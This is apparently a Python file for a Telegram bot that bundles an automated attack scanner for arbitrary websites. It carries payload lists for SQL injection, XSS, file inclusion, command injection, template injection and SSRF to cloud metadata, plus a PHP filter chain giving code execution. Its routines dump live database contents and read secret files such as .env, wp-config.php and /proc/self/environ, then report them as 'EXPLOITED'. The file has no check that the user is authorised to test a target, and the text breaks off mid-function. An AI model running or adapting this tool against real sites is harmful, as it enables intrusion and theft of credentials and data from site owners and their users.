#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════
#  ARM-FS v16-TG "APEX-ULTRA ONE-FILE" — 28 Vectors · 100% VERIFIED
#  · Telegram bot + scanner նույն ֆայլում (Railway-ready)
#  · Միայն BOT_TOKEN-ն է պետք (env կամ ներքևում գրիր)
#  · Admin-ը ավտոմատ՝ առաջին /start անողը
#  · Live անիմացիա՝ spinner + progress bar + findings push
#  Railway: 1) վերբեռնիր bot.py 2) Variables → BOT_TOKEN=xxx
#           3) Start command: python3 bot.py
#  Termux:  pip install requests && BOT_TOKEN=xxx python3 bot.py
# ═══════════════════════════════════════════════════════════════
import re, sys, os, json, time, base64, random, string, itertools, uuid, threading, subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FTErr
from urllib.parse import quote as urlp
import requests, requests.adapters
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# ─── BOT CONFIG ───
BOT_TOKEN = os.environ.get("BOT_TOKEN", "PUT_TOKEN_HERE")
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
ADMIN_FILE = "admins.json"
ADMINS = set()
try:
    if os.path.exists(ADMIN_FILE):
        ADMINS = set(json.load(open(ADMIN_FILE)))
except Exception: pass

def tg(method, **kw):
    try:
        r = requests.post(f"{API}/{method}", json=kw, timeout=20)
        return r.json().get("result")
    except Exception: return None
def esc(s): return html.escape(str(s))
import html

# ─── SCANNER CONFIG ───
FAST     = False
INSECURE = False
BUDGET   = 900
PHASE_BUDGET = {"recon":120,"sqli":150,"xss":100,"lfi":70,"cmdi":60,"ssti":50,
    "ssrf":60,"redir":35,"idor":70,"auth":60,"xxe":45,"headers":35,"misc":35,
    "php":50,"log4shell":35,"hosthdr":25,"ppoll":50,"crlf":35,"401bypass":50,
    "deser":50,"methods":15,"massassign":35,"extfiles":70,"cors":25,"nosql":40,
    "oobssrf":60,"apisweep":40,"xss_ext":70}
WORKERS = 24
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
MARKER = "ARMF" + "".join(random.choices(string.ascii_lowercase, k=6))
PATCHED = {"8.5":"8.5.12","8.4":"8.4.27","8.3":"8.3.36","8.2":"8.2.35"}
T0 = time.time(); DEADLINE = T0 + BUDGET

# ─── TELEGRAM LIVE PANEL (անիմացիա) ───
class Panel:
    def __init__(self, chat_id, title, budget):
        self.chat, self.title, self.budget = chat_id, title, budget
        self.t0 = time.time(); self.lock = threading.Lock()
        self.lines, self.hits, self.phases_done = [], 0, 0
        self.dead = False
        self.msg = tg("sendMessage", chat_id=chat_id,
            text=f"🛡 <b>ARM-FS v16 APEX-ULTRA</b>\n🎯 <b>{esc(title)}</b>\n⏳ initializing…",
            parse_mode="HTML")
        threading.Thread(target=self._loop, daemon=True).start()
    def log(self, ln):
        with self.lock:
            self.lines.append(ln); self.lines = self.lines[-8:]
    def hit(self):
        with self.lock: self.hits += 1
    def _render(self):
        el = int(time.time()-self.t0)
        pct = min(100, int(el*100/self.budget)) if self.budget else 0
        with self.lock:
            tail = "\n".join(self.lines[-8:]); h, ph = self.hits, self.phases_done
        fr = "◐◓◑◒"[el%4]; ic = ["⚡","🔥","🎯","☠","🗡","💣","🚀","👁","✦","◆"][el%10]
        mm, ss = el//60, el%60
        return (f"╔═══════════════════════════════╗\n"
                f"║ {ic} <b>{esc(self.title[:30])}</b> {fr}\n"
                f"╠═══════════════════════════════╣\n"
                f"⏱ <b>{mm}:{ss:02d}</b> / {self.budget}s · {pct}%\n"
                f"[{'█'*(pct//10)}{'░'*(10-pct//10)}]\n"
                f"💥 findings: <b>{h}</b> · 📡 phases: <b>{ph}/28</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"<pre>{esc(tail) or '· scanning…'}</pre>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🛡 <i>100% VERIFIED-ONLY · proof ×2 դետերմինիստ</i>")
    def _loop(self):
        while not self.dead:
            if self.msg: tg("editMessageText", chat_id=self.chat,
                message_id=self.msg["message_id"], text=self._render(), parse_mode="HTML")
            time.sleep(2.5)
    def finish(self, final):
        self.dead = True
        if self.msg: tg("editMessageText", chat_id=self.chat,
            message_id=self.msg["message_id"], text=final,
            parse_mode="HTML", disable_web_page_preview=True)

PANEL = None
def ui_log(m, chat_hint=None):
    if PANEL: PANEL.log(m[:60])

# ─── HTTP ───
S = requests.Session()
S.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9"})
ad = requests.adapters.HTTPAdapter(pool_connections=WORKERS, pool_maxsize=WORKERS)
S.mount("https://", ad); S.mount("http://", ad)
VERIFY = True
PACING = 0.05
TLS_NOTE = None

def _do(method, url, **kw):
    global TLS_NOTE
    timeout = kw.pop("timeout", 6)
    try:
        r = S.request(method, url, timeout=timeout, verify=VERIFY, allow_redirects=False, **kw)
        return r.status_code, {k.lower(): v for k, v in r.headers.items()}, r.content
    except requests.exceptions.SSLError as e:
        if TLS_NOTE is None: TLS_NOTE = f"TLS: {str(e)[:120]}"
        return None, {}, b""
    except Exception: return None, {}, b""

def http_get(url, timeout=6, headers=None):
    if PACING: time.sleep(PACING)
    return _do("GET", url, timeout=timeout, headers=headers or {})
def http_post(url, data=None, timeout=6, headers=None, js=False, files=None):
    if PACING: time.sleep(PACING)
    return _do("POST", url, timeout=timeout, json=data if js else None,
               data=None if (js or files) else data, files=files, headers=headers or {})
def base_url(d): return d.rstrip("/") if d.startswith("http") else f"https://{d}".rstrip("/")

def pmap(fn, items, workers=WORKERS, timeout=None):
    out = []
    if not items: return out
    if timeout is None or timeout < 5: timeout = 60
    ex = ThreadPoolExecutor(max_workers=min(workers, max(1, len(items))))
    futs = {ex.submit(fn, it): it for it in items}
    try:
        for f in as_completed(futs, timeout=timeout):
            try: r = f.result()
            except Exception: continue
            if r is not None: out.append((futs[f], r))
    except FTErr: pass
    finally:
        ex.shutdown(wait=False, cancel_futures=True)
    return out

# ─── FINDINGS GATE ───
FINDINGS, PROOFS, REJECTED, NOTES = [], [], [], []
def register(sev, title, result, evidence, owasp="A03", conf="HIGH", method=""):
    FINDINGS.append(dict(sev=sev, title=title, evidence=evidence, owasp=owasp,
                         confidence=conf, method=method))
    PROOFS.append(dict(vuln=title, sev=sev, result=result, confidence=conf))
    if PANEL:
        PANEL.hit()
        PANEL.log(f"{'🔴' if sev in ('CRITICAL','HIGH') else '🟡'} [{sev}] {title[:44]}")
        if sev in ("CRITICAL","HIGH"):
            tg("sendMessage", chat_id=PANEL.chat, parse_mode="HTML",
               text=f"{'🔴' if sev=='CRITICAL' else '🟠'} <b>[{sev}/{conf}] — EXPLOITED</b>\n"
                    f"<code>{esc(title[:180])}</code>")
def register_strict(sev, title, result, evidence, owasp="A03", conf="HIGH",
                    method="", proof_fn=None):
    if proof_fn is None:
        reject(title, "proof_fn բացակայում է"); return False
    try:
        p1 = proof_fn()
        if p1 is None: reject(title, "proof ×1 — չկրկնվեց"); return False
        p2 = proof_fn()
        if p2 is None or str(p2) != str(p1):
            reject(title, "proof ×2 — ոչ դետերմինիստ"); return False
    except Exception as e:
        reject(title, f"proof error: {e}"); return False
    register(sev, title, result, evidence, owasp, conf, method); return True
def reject(title, reason): REJECTED.append(dict(title=title, reason=reason))
def note2(t, x): NOTES.append(dict(title=t, text=x))
def phase_alive(): return time.time() < DEADLINE
def pleft(): return max(5, int(DEADLINE - time.time()))

# ─── BASELINE + WAF ───
class Baseline:
    def __init__(self, base):
        lens, times = [], []
        for _ in range(3):
            t0 = time.time(); st, h, b = http_get(base + "/", 8)
            if b: lens.append(len(b)); times.append(time.time()-t0)
        self.lens = lens or [0]
        self.time_thresh = 4.0 + max(1.0, (max(times)-min(times)) if times else 0.5)
        st, h, b = http_get(base + f"/ARMFNOPE{MARKER}", 8)
        self.nope_st = st
        self.nope_len = len(b) if b else 0
        self.nope_html = b[:200] if b else b""
    def real_page(self, st, b):
        if st is None or not b: return False
        if self.nope_st is None: return st == 200
        if st != self.nope_st and st == 200: return True
        if abs(len(b) - self.nope_len) > max(50, self.nope_len // 10): return True
        if b[:200] == self.nope_html: return False
        return st == 200
BASE = None

def waf_fingerprint(base):
    global PACING
    st, h, b = http_get(base + "/?q=<script>alert(1)</script>", 8)
    head = " ".join(f"{k}: {v}" for k, v in (h or {}).items()).lower()
    txt = (b or b"").decode("utf-8","ignore").lower()
    det = "Cloudflare" if ("cloudflare" in head or "cf-ray" in head) else \
          "AWS" if ("awselb" in head or "x-amzn" in head) else \
          "Sucuri" if "x-sucuri-id" in head else \
          "ModSecurity" if (re.search(r"mod_security|modsecurity", txt) or "x-waf" in head) else \
          "Akamai" if "akamai" in head else None
    if det: PACING = 0.08; ui_log(f"WAF: {det} — pacing ON")

# ─── OOB ───
OOB_HOST, OOB_SECRET = None, None
def oob_init():
    global OOB_HOST, OOB_SECRET
    try:
        r = requests.post("https://webhook.site/token", timeout=8, headers={"User-Agent": UA})
        j = r.json(); OOB_HOST = j.get("uuid",""); OOB_SECRET = j.get("secret","")
    except Exception: note2("OOB", "webhook.site unavailable")
def oob_hits():
    if not OOB_HOST: return []
    try:
        r = requests.get(f"https://webhook.site/token/{OOB_HOST}/requests",
                         params={"secret": OOB_SECRET, "sorting": "newest"},
                         timeout=8, headers={"User-Agent": UA})
        return r.json().get("data", [])
    except Exception: return []

# ─── PAYLOADS ───
SQLI_ERR_PL = ["'", "' OR '1'='1", "' OR 1=1-- -",
    "' AND extractvalue(1,concat(0x7e,version()))-- -",
    "' AND updatexml(1,concat(0x7e,version()),1)-- -", "' UNION SELECT NULL-- -"]
if not FAST:
    SQLI_ERR_PL += ['"', '" OR "1"="1', "' OR 1=1#", "1' ORDER BY 10-- -",
        "') OR ('1'='1", "admin'-- -", "' UNION SELECT NULL,NULL-- -",
        "' AND 1=CONVERT(int,@@version)-- -", "' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
        "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,version(),FLOOR(RAND(0)*2))x "
        "FROM information_schema.tables GROUP BY x)a)-- -",
        "' OR EXISTS(SELECT 1 FROM dual)-- -", "'; EXEC xp_cmdshell('echo ARMF_TEST')-- -"]
SQLI_TIME_PL = ["1' AND SLEEP(5)-- -", "1';SELECT pg_sleep(5)-- -"]
if not FAST: SQLI_TIME_PL += ["1 AND SLEEP(5)", "1';WAITFOR DELAY '0:0:5'-- -",
    "1 AND (SELECT 8952 FROM PG_SLEEP(5))", "1' AND BENCHMARK(5000000,MD5('x'))-- -"]
SQLI_NOSQL_PL = ['{"$gt":""}', '{"$ne":null}'] if FAST else \
    ['{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}']
SQLI_ERRS = [b"you have an error in your sql syntax", b"warning: mysql",
    b"unclosed quotation", b"quoted string not properly terminated", b"pg_query",
    b"ora-\\d{5}", b"sqlstate", b"mysql_fetch", b"syntax error at or near",
    b"psql:", b"sqlite_query", b"pg_exec", b"mssql_query"]
def sqli_err(b): return b and any(re.search(e, b.lower()) for e in SQLI_ERRS)

def gen_xss_universal():
    tags = ["script","img","svg","iframe","body","video","object","details",
            "marquee","audio","form","math","style"]
    vec = []
    for t in tags:
        vec += [f"<{t} src=x onerror={MARKER}>", f"<{t} onload={MARKER}>"]
    vec += [f"<svg><animate onbegin={MARKER} attributeName=x>",
            f"<xss id=x tabindex=1 onactivate={MARKER}></xss>",
            "</script><script>" + MARKER + "</script>",
            "'+" + MARKER + "+'", '";' + MARKER + ';//',
            f"<!--><script>{MARKER}</script-->"]
    return vec
XSS_VEC_PL = [f"<script>{MARKER}</script>", f'"><script>{MARKER}</script>',
    f'" onfocus=alert(1) autofocus="', f"<img src=x onerror={MARKER}>", f"<svg onload={MARKER}>"]
if not FAST:
    XSS_VEC_PL += [f"'><script>{MARKER}</script>", f"<svg/onload=alert(1)>",
        f"</textarea><script>{MARKER}</script>", f"</title><script>{MARKER}</script>",
        f"--><script>{MARKER}</script>", f"<a href='javascript:{MARKER}'>x</a>",
        f"<iframe srcdoc='&lt;script&gt;{MARKER}&lt;/script&gt;'>"]
DOM_SOURCES = ["location.href","location.search","location.hash","document.URL","document.referrer","window.name"]
DOM_SINKS = ["innerHTML","outerHTML","document.write","eval","setTimeout","insertAdjacentHTML"]
LFI_PL = ["../"*4 + "etc/passwd", "..%2f"*4 + "etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd", "/etc/passwd", "....//"*4 + "etc/passwd"]
if not FAST:
    LFI_PL += ["../"*i + "etc/passwd" for i in (1,2,3,5,6,7,8)] + \
        ["%2e%2e/"*4 + "etc/passwd", "..%252f"*4 + "etc/passwd",
         "/%2e%2e/%2e%2e/etc/passwd", "/proc/self/environ", "C:/Windows/win.ini"]
    LFI_PL += [("../"*i + s) for i in range(1, 7)
               for s in ("etc/hosts","proc/self/cmdline","etc/apache2/apache2.conf",
                         "usr/local/etc/php/php.ini")]
    LFI_PL += ["php://filter/convert.base64-encode/resource=" + f
               for f in ("index.php","config.php","wp-config.php",".env")]
TRAVERSAL = [b"root:x:0:0", b"root:*:0:0", b"[extensions]", b"daemon:x:1:1"]
CMDI_PL = [";id", "|id", "$(id)", "`id`", "&&id"]
if not FAST: CMDI_PL += ["||id", "&id", "\nid", '";id;"', "| id #", "&&id&&", ";`id`"]
SSTI_PL = ["{{7*7}}", "${7*7}"]
if not FAST: SSTI_PL += ["<%= 7*7 %>", "#{7*7}", "{{7*'7'}}", "{{config}}",
    '{{ c.__init__.__globals__["os"].popen("id").read() }}',
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}"]
SSRF_PL = ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80", "http://localhost:22"]
if not FAST: SSRF_PL += ["http://metadata.google.internal/computeMetadata/v1/",
    "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO"]
PPOLL_PL = ['{"__proto__":{"isAdmin":true}}', '{"__proto__":{"role":"admin"}}',
    '{"constructor":{"prototype":{"isAdmin":true}}}',
    '__proto__[_proto_]=1&__proto__[role]=admin']
DESER_PL = {"java": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==ARMF_DESER",
    "php":  'O:8:"stdClass":1:{s:4:"test";s:11:"ARMF_DESER_TEST";}',
    "py":   "gASVARMFPICKLE\n"}
def php_filter_chain(cmd):
    return ("php://filter/convert.iconv.UTF-8.CSISO2022KR|"
            "convert.base64-encode|convert.iconv.UTF8.UTF7|"
            "convert.iconv.UTF8.UTF16|convert.base64-decode|"
            "convert.base64-encode|convert.iconv.IBM1381.CP936|"
            "convert.base64-decode|convert.base64-decode|"
            "convert.iconv.UTF-8.UTF-7|convert.base64-decode"
            f"|resource=data://text/plain,<?php system('{cmd}');?>")

# ─── RECON ───
RECON_PATHS = ["/", "/index.php", "/login", "/admin", "/search", "/api", "/api/v1",
    "/wp-login.php", "/robots.txt", "/graphql", "/user", "/items", "/contact",
    "/register", "/download", "/file", "/redirect", "/upload", "/comment",
    "/profile", "/post", "/news", "/blog", "/administrator", "/dashboard",
    "/signin", "/auth", "/wp-admin/", "/wp-json/wp/v2/users", "/actuator",
    "/swagger.json", "/openapi.json", "/.env", "/.git/config", "/phpinfo.php",
    "/sitemap.xml", "/product", "/cart", "/checkout", "/order",
    "/wp-content/uploads/", "/cgi-bin/", "/test", "/dev", "/status",
    "/config", "/install", "/setup", "/old", "/tmp", "/data", "/db", "/sql",
    "/backup", "/bak", "/admin.php", "/admin/login", "/manager", "/panel",
    "/cpanel", "/console", "/api/v2", "/api/users", "/api/orders", "/api/me",
    "/api/admin", "/rest", "/v1", "/v2", "/feed", "/rss", "/cron", "/jobs",
    "/queue", "/debug", "/trace", "/metrics", "/health", "/ping", "/info",
    "/version", "/changelog", "/readme.txt", "/LICENSE", "/composer.json",
    "/package.json", "/.htaccess", "/assets", "/static", "/js", "/css",
    "/img", "/media", "/includes", "/lib", "/vendor", "/dist", "/build"]
EXT_RECON_PATHS = ["/.well-known/security.txt", "/.DS_Store", "/server-info", "/web.config",
    "/WEB-INF/web.xml", "/crossdomain.xml", "/admin/config.php", "/wp-config.php.save",
    "/wp-config.php~", "/config.php.bak", "/database.sql", "/dump.sql", "/db.sql",
    "/site.zip", "/www.zip", "/web.zip", "/src.zip", "/app.zip", "/backup.zip",
    "/cgi-bin/test.cgi", "/cgi-bin/printenv", "/api-docs", "/api/swagger",
    "/swagger-ui.html", "/graphiql", "/druid/index.html", "/solr/admin",
    "/elasticsearch/", "/_cat/indices", "/console/", "/jenkins/script",
    "/elmah.axd", "/trace.axd", "/elmah", "/.svn/entries", "/.svn/wc.db", "/CVS/Entries",
    "/id_rsa", "/authorized_keys", "/adminer/", "/phpmyadmin/", "/pma/",
    "/storage/logs/laravel.log", "/laravel.log", "/error_log",
    "/wp-content/debug.log", "/.env.bak", "/.env.old", "/.git/HEAD"]

def recon(base):
    ui_log("PHASE 0 — RECON")
    forms, params, pages, uploads = [], [], [], []
    def scan(p):
        st, h, b = http_get(base + p, 6)
        if not b or not BASE.real_page(st, b): return None
        return (p, st, h, b)
    for _, (p, st, h, b) in pmap(scan, RECON_PATHS, timeout=min(PHASE_BUDGET["recon"], pleft())):
        pages.append(p)
        body = b.decode("utf-8","ignore")
        for m in re.finditer(r'<form[^>]*action=["\']?([^"\'>\s]*)["\']?[^>]*>(.*?)</form>', body, re.S|re.I):
            action = m.group(1) or p
            if not action.startswith("/"): action = "/" + action.lstrip("/")
            meth = "POST" if re.search(r"method=['\"]?post", m.group(0), re.I) else "GET"
            inputs = list(dict.fromkeys(re.findall(r'<(?:input|textarea)[^>]*name=["\']?([^"\'>\s]+)["\']?', m.group(2), re.I)))
            if "file" in m.group(2).lower(): uploads.append((action, inputs, meth))
            if inputs: forms.append((action, inputs, meth))
        for m in re.finditer(r'[?&](\w+)=', body):
            if m.group(1) not in params: params.append(m.group(1))
    def js_scan(pg):
        _, _, b = http_get(base + pg, 6)
        if not b: return None
        found = []
        for src in re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', b.decode("utf-8","ignore"))[:4]:
            jsu = src if src.startswith("http") else base + "/" + src.lstrip("/")
            _, _, jb = http_get(jsu, 6)
            if not jb: continue
            for pm in re.finditer(r'''(?:fetch|axios|get|post)\s*\(\s*["'`]([^"'`]*\?[^"'`]+)["'`]''', jb.decode("utf-8","ignore")):
                found += re.findall(r'[\?&](\w+)=', pm.group(1))
        return found or None
    for _, found in pmap(js_scan, pages[:8], workers=8, timeout=40):
        for pmn in found:
            if pmn not in params: params.append(pmn)
    params += [c for c in ("id","page","q","file","cat","user","name","url","item","view","path",
        "redirect","next","sort","email","search","msg","comment","lang","template","cmd",
        "ip","host","action","token","key","ref","data","query","filter","order") if c not in params]
    ui_log(f"RECON ✓ pages={len(pages)} forms={len(forms)} params={len(params)}")
    if PANEL: PANEL.phases_done += 1
    return forms, params, pages, uploads

def build_points(base, params, forms):
    pts = []
    for p in params:
        pts.append(("GET", f"{base}/?{p}=", {p: None}))
        if not FAST:
            pts.append(("POST-FORM", base + "/", {p: None}))
            pts.append(("POST-JSON", base + "/", {p: None}, True))
    for action, inputs, meth in forms:
        for i in inputs:
            if meth == "POST" and not FAST:
                pts.append(("POST-FORM", base + action, {i: None}))
                pts.append(("POST-JSON", base + action, {i: None}, True))
            else:
                pts.append(("GET", f"{base}{action}?{i}=", {i: None}))
    return pts

def send(pt, val):
    kind, url, tpl = pt[0], pt[1], pt[2]
    if kind == "GET": return http_get(url + urlp(str(val)), 8)
    js = len(pt) > 3 and pt[3]
    d = dict(tpl); d[list(d)[0]] = val
    return http_post(url, d, 8, js=js)
def pt_name(pt):
    k = pt[2] or {}
    return f"{pt[0]} {pt[1].split('/')[-1] or '/'}?{list(k)[0] if k else ''}"

# ─── 1. SQLi ───
def a_sqli(pts, bl):
    ui_log("VECTOR 1/28 — SQLi"); SPset("SQLi")
    hits = {}
    def err_probe(pt, pl):
        st, h, b = send(pt, pl)
        if not sqli_err(b): return None
        st2, h2, b2 = send(pt, "1")
        if sqli_err(b2): return None
        return (pl, b[:200].decode("utf-8","ignore"))
    def time_probe(pt, pl):
        t0 = time.time(); send(pt, pl)
        return time.time()-t0 if time.time()-t0 > bl.time_thresh + 4 else None
    def time_ctrl(pt):
        t0 = time.time(); send(pt, "1"); return time.time()-t0
    def bool_probe(pt, t, f):
        st1, h1, b1 = send(pt, t); st2, h2, b2 = send(pt, f)
        if not (b1 and b2): return None
        return (len(b1), len(b2)) if (abs(len(b1)-len(b2)) > 50 and len(b1) > 300) else None
    def bool_ctrl(pt, t):
        st1, h1, b1 = send(pt, t); st2, h2, b2 = send(pt, t)
        if b1 is None or b2 is None: return None
        return (len(b1), len(b2)) if abs(len(b1)-len(b2)) > 100 else None
    for it, r in pmap(lambda x: err_probe(*x), [(pt, pl) for pt in pts for pl in SQLI_ERR_PL],
                      timeout=min(PHASE_BUDGET["sqli"], pleft())):
        pt, pl = it; plp, evtxt = r
        if confirm(lambda: err_probe(pt, plp), None, "STRONG"):
            hits.setdefault("error", (pt, (plp, evtxt)))
    if not hits and phase_alive():
        for it, r in pmap(lambda x: time_probe(*x), [(pt, pl) for pt in pts for pl in SQLI_TIME_PL],
                          timeout=min(60, pleft())):
            pt, pl = it
            if confirm(lambda: time_probe(pt, pl),
                       lambda: None if time_ctrl(pt) < bl.time_thresh + 4 else "ctrl", "MEDIUM"):
                if time_ctrl(pt) < bl.time_thresh + 4: hits.setdefault("time", (pt, pl))
    if not hits and phase_alive():
        for it, r in pmap(lambda x: bool_probe(*x),
                          [(pt, t, f) for pt in pts for (t, f) in
                           [("1 AND 1=1","1 AND 1=2"), ("' AND 'a'='a'-- -","' AND 'a'='b'-- -")]],
                          timeout=min(60, pleft())):
            pt, t, f = it
            if confirm(lambda: bool_probe(pt, t, f), lambda: bool_ctrl(pt, t) or None, "MEDIUM"):
                if bool_ctrl(pt, t) is None: hits.setdefault("bool", (pt, t))
    if not hits:
        reject("SQLi", "չհայտնաբերվեց (control ֆիլտրով)"); done("SQLi"); return
    for kind, (pt, ev) in hits.items():
        if kind == "error":
            register_strict("HIGH", "SQL Injection (error-based)", [f"DB error: {ev[1]}"], pt_name(pt),
                conf="HIGH", method="DB error ×2 + control",
                proof_fn=lambda pt=pt, pl=ev[0]: err_probe(pt, pl))
        elif kind == "time":
            register_strict("MEDIUM", "SQL Injection (time-based blind)",
                [f"delay > {bl.time_thresh+4:.1f}s — {ev}"], pt_name(pt), conf="MEDIUM",
                method="timing + control", proof_fn=lambda pt=pt, pl=ev: time_probe(pt, pl))
        elif kind == "bool":
            register_strict("MEDIUM", "SQL Injection (boolean-based blind)", [f"TRUE/FALSE diff: {ev}"],
                pt_name(pt), conf="MEDIUM", method="response-diff + control",
                proof_fn=lambda pt=pt, t=ev: bool_probe(pt, t, "1 AND 1=2"))
    if "error" in hits and phase_alive():
        pt, _ = hits["error"]; cols = None
        for n in range(1, 13):
            def probe_c(n=n, pt=pt):
                st, h, b = send(pt, f"1 UNION SELECT {','.join(['NULL']*n)}-- -")
                return n if (st not in (500, None) and not sqli_err(b)) else None
            if probe_c() is not None and confirm(lambda: probe_c(), None, "STRONG"):
                cols = n; break
        if cols:
            ui_log(f"UNION — {cols} սյուն")
            harvested = []
            def extract(expr):
                st, h, b = send(pt, f"1 UNION SELECT {expr}," + ",".join(["NULL"]*(cols-1)) + "-- -")
                if not b: return None
                vals = [x for x in re.findall(r"[A-Za-z0-9_.@:%$#/+-]{4,}", b.decode("utf-8","ignore"))
                        if not re.search(r"union|script|css|font", x, re.I)][:15]
                return "\n".join(vals) if vals else None
            for tag, expr in (("VERSION","version()"), ("DATABASE","database()"),
                ("TABLES","GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()")):
                r = extract(expr)
                if r and confirm(lambda e=expr: extract(e), None, "STRONG"):
                    harvested.append(f"── {tag} ──\n{r}")
            if harvested:
                register_strict("CRITICAL", "SQLi UNION dump — LIVE DB DATA", harvested, pt_name(pt),
                    conf="HIGH", method="real DB dump ×2", proof_fn=lambda: extract("version()"))
    done("SQLi")

def confirm(rerun, control=None, level="STRONG"):
    r1 = rerun()
    if r1 is None: return None
    r2 = rerun()
    if not (r2 is not None and str(r2) == str(r1)): return None
    if level != "STRONG" and control is not None and control() is not None: return None
    return r1

def SPset(l): ui_log(f"▶ {l}")
def done(name):
    if PANEL: PANEL.phases_done += 1

# ─── 2. XSS ───
def a_xss(pts, pages):
    ui_log("VECTOR 2/28 — XSS")
    def ref_probe(pt, pl):
        st, h, b = send(pt, pl)
        if not b or MARKER.encode() not in b: return None
        ctx = b.decode("utf-8","ignore"); i = ctx.find(MARKER)
        around = ctx[max(0,i-60):i+len(MARKER)+20]
        if f"&lt;script&gt;{MARKER}" in ctx or "%3cscript%3e" in ctx.lower(): return None
        return around if any(t in around for t in ("<script","onerror","onload","ontoggle",
            "onfocus","javascript:","srcdoc","<img","<svg","<iframe","<body")) else None
    found = []
    for it, r in pmap(lambda x: ref_probe(*x), [(pt, pl) for pt in pts for pl in XSS_VEC_PL],
                      timeout=min(PHASE_BUDGET["xss"], pleft())):
        pt, pl = it
        if confirm(lambda: ref_probe(pt, pl), None, "STRONG"): found.append((pt, pl))
    for pt, pl in found[:5]:
        register_strict("HIGH", f"Reflected XSS ({pt_name(pt)})", [f"PoC: {pt_name(pt)} + {pl[:60]}"],
            pt_name(pt), conf="HIGH", method="executable reflection ×2",
            proof_fn=lambda pt=pt, pl=pl: ref_probe(pt, pl))
    if not found: reject("Reflected XSS", "չհայտնաբերվեց")
    SPset("Stored XSS"); stored_done = False
    base = base_url(DOMAIN)
    def inject(pt):
        st, h, b = send(pt, XSS_VEC_PL[0]); return b if b else None
    def recheck(pg):
        st, h, b = http_get(base + pg, 6)
        return (pg, b) if (b and MARKER.encode() in b) else None
    for pt in [p for p in pts if p[0] != "GET"]:
        if stored_done or not phase_alive(): break
        if inject(pt) is None: continue
        for _, (pg2, body) in pmap(lambda p: recheck(p), pages[:8], workers=8, timeout=40):
            ctx = body.decode("utf-8","ignore"); i = ctx.find(MARKER)
            around = ctx[max(0,i-60):i+len(MARKER)+20]
            if any(t in around for t in ("<script","onerror","onload","<img","<svg")):
                if confirm(lambda: recheck(pg2), None, "STRONG"):
                    register_strict("CRITICAL", f"Stored XSS → {pg2}",
                        [f"Inject: {pt_name(pt)}", f"Persistent: {pg2}"], pt_name(pt),
                        conf="HIGH", method="persisted payload ×2",
                        proof_fn=lambda pg2=pg2: recheck(pg2))
                    stored_done = True; break
    if not stored_done: reject("Stored XSS", "չհայտնաբերվեց")
    SPset("DOM XSS"); dom_found = False
    def domchk(pg):
        st, h, b = http_get(base + pg, 6)
        if not b: return None
        js = b.decode("utf-8","ignore")
        srcs = [s for s in DOM_SOURCES if s in js]; sinks = [sn for sn in DOM_SINKS if sn in js]
        return (pg, srcs, sinks, js) if (srcs and sinks) else None
    for _, (pg, srcs, sinks, js) in pmap(lambda p: domchk(p), pages[:10], timeout=60):
        ctxs = []
        for s in srcs:
            for sn in sinks:
                for m in re.finditer(re.escape(sn) + r"\s*\(([^)]{0,80})", js):
                    if s in m.group(1) or "location" in m.group(1):
                        ctxs.append(f"{s} → {sn}({m.group(1)[:50]})")
        if ctxs:
            stf, hf, bf = http_get(base + pg + "#" + MARKER, 6)
            conf = "HIGH" if (bf and MARKER.encode() in bf) else "MEDIUM"
            register_strict("MEDIUM", f"DOM XSS — {pg}",
                [f"Source: {', '.join(srcs)}", f"Sink: {', '.join(sinks)}"] + ctxs[:2], pg,
                conf=conf, method="static source→sink"
                + (" + fragment reflection" if conf == "HIGH" else ""), proof_fn=lambda pg=pg: domchk(pg))
            dom_found = True; break
    if not dom_found: reject("DOM XSS", "չհայտնաբերվեց")
    done("XSS")

# ─── 3. LFI ───
LFI_HIT = None
def a_lfi(pts):
    global LFI_HIT
    ui_log("VECTOR 3/28 — LFI")
    def probe(pt, x):
        st, h, b = send(pt, x)
        if not b: return None
        if any(t in b for t in TRAVERSAL): return (x, b)
        if "base64" in x:
            m = re.search(rb"([A-Za-z0-9+/=]{100,})", b)
            if m:
                try:
                    d = base64.b64decode(m.group(1))
                    if b"root:x:" in d: return (x, d)
                except Exception: pass
        return None
    hit = None
    for it, r in pmap(lambda x: probe(*x), [(pt, x) for pt in pts for x in LFI_PL],
                      timeout=min(PHASE_BUDGET["lfi"], pleft())):
        pt, x = it; xval, data = r
        if confirm(lambda: probe(pt, xval), None, "STRONG"):
            hit = (pt, xval, data); break
    if not hit:
        reject("LFI", "չհայտնաբերվեց"); done("LFI"); return
    pt, x, data = hit; LFI_HIT = (pt, x)
    lines = [ln for ln in data[:400].decode("utf-8","ignore").splitlines() if ln.strip()][:8]
    register_strict("CRITICAL", "LFI — /etc/passwd (REAL FILE)", lines, pt_name(pt), "A01",
        conf="HIGH", method="real file content ×2", proof_fn=lambda: probe(pt, x))
    def read(f):
        for xx in (f, "../"*6 + f.lstrip("/"), "php://filter/convert.base64-encode/resource=" + f):
            st, h, b = send(pt, xx)
            if not b: continue
            d = b
            if "base64" in xx:
                m = re.search(rb"([A-Za-z0-9+/=]{100,})", b)
                if m:
                    try: d = base64.b64decode(m.group(1))
                    except Exception: continue
            if d and not re.match(rb"<(?:html|!DOCTYPE)", d[:80]):
                return d[:400].decode("utf-8","ignore")
        return None
    for f in ("/proc/self/environ", "/var/www/html/wp-config.php",
              "/var/www/html/.env", "/etc/nginx/nginx.conf"):
        r = read(f)
        if r and confirm(lambda: read(f), None, "STRONG"):
